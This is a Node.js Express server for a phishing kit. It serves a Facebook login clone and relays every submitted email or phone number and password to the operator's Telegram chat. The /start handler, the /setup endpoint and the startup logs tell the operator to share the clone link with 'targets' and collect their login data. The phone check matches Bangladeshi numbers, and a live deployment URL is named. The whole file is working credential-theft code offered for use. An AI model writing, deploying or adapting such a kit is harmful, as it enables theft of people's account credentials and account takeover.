const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

// === Telegram Bot Config ===
const BOT_TOKEN = process.env.BOT_TOKEN;

// Validate required environment variables
if (!BOT_TOKEN) {
  console.error('❌ BOT_TOKEN is required in .env file');
  process.exit(1);
}

// Initialize Telegram Bot with polling (instead of webhook)
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ✅ This will store chat ID once user sends `/start`
let CHAT_ID = null;

// === Middleware ===
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// === Serve Static Files (Images, CSS, JS) ===
app.use('/images', express.static(path.join(__dirname, 'images')));
app.use(express.static(path.join(__dirname, 'public')));

// === Serve Frontend (index.html in root) ===
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// === Bot Commands (Using polling instead of webhook) ===
bot.onText(/\/start/, (msg) => {
  CHAT_ID = msg.chat.id;
  console.log('💬 Chat ID set:', CHAT_ID);
  
  const link = 'https://bankai-85ve.onrender.com';
  
  bot.sendMessage(CHAT_ID, 
    `🎯 Welcome to Login Capture Bot!\n\n🔗 Click here to access Clone:\n${link}\n\n📝 After someone fills the form, you'll receive their login details here.`
  ).then(() => {
    console.log('✅ Welcome message with link sent');
  }).catch(err => {
    console.error('❌ Failed to send welcome message:', err.message);
  });
});

// === Form Submission Endpoint ===
app.post('/submit', async (req, res) => {
  console.log('📨 Form submission received:', req.body);
  
  const { Email, Password } = req.body;
  
  // Validate input
  if (!Email || !Password) {
    console.log('❌ Missing email or password');
    return res.status(400).json({
      error: 'Email/Phone and Password are required'
    });
  }
  
  // Basic validation for email or phone
  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  // const phonePattern = /^(?:\+880|880|0)1[3-9]\d{8}$/;
  const bdPhonePattern = /^(?:\+880|880|0)1[3-9]\d{8}$/;

  if (!emailPattern.test(Email)  && !bdPhonePattern.test(Email)) {
    console.log('❌ Invalid email or phone format');
    return res.status(400).json({
      error: 'Please enter a valid email address or phone number'
    });
  }
  
  if (!CHAT_ID) {
    console.log('❌ No chat ID available');
    return res.status(400).json({
      error: 'Bot has not been started yet. Send /start to the bot first.'
    });
  }

  const msg = `
🎯 NEW LOGIN CAPTURED!

👤 User Details:
📧 Email/Phone: ${Email}
🔑 Password: ${Password}
⏰ Time: ${new Date(new Date().getTime() + 6 * 60 * 60 * 1000).toLocaleString()}
🌍 Environment: ${process.env.NODE_ENV || 'development'}
═══════════════════════
`;

  try {
    await bot.sendMessage(CHAT_ID, msg);
    console.log('✅ Message sent to Telegram');
    res.status(200).json({ message: '✅ Data sent to Telegram bot.' });
  } catch (err) {
    console.error('❌ Telegram API error:', err.message);
    res.status(500).json({ error: 'Failed to send message to Telegram.' });
  }
});

// === Setup Verification Endpoint ===
app.get('/setup', (req, res) => {
  res.json({
    server: 'Running ✅',
    chatId: CHAT_ID ? `Set (${CHAT_ID})` : 'Not set - Send /start to bot',
    botStatus: 'Polling mode active',
    environment: process.env.NODE_ENV || 'development',
    deployUrl: process.env.DEPLOY_URL || 'Not set',
    instructions: [
      '1. Send /start to your Telegram bot',
      '2. Bot will send Facebook clone link',
      '3. Share link with targets',
      '4. Receive login data in Telegram!'
    ]
  });
});

// === Health Check Endpoint ===
app.get('/health', (req, res) => {
  res.json({
    status: 'OK',
    chatId: CHAT_ID ? 'Set' : 'Not set',
    environment: process.env.NODE_ENV || 'development',
    timestamp: new Date().toISOString()
  });
});

// === Start Server ===
app.listen(port, () => {
  console.log(`✅ Server running on https://bankai-85ve.onrender.com:${port}`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔗 Deploy URL: ${process.env.DEPLOY_URL || 'Not set'}`);
  console.log(`📡 Current Chat ID: ${CHAT_ID || 'Not set - Send /start to bot'}`);
  console.log(`🤖 Bot is active and listening for /start command!`);
  console.log(`\n🚀 SETUP INSTRUCTIONS:`);
  console.log(`1. Send /start to your bot`);
  console.log(`2. Bot will send Facebook clone link`);
  console.log(`3. Share the link with targets`);
  console.log(`4. Receive login data in Telegram!\n`);
});
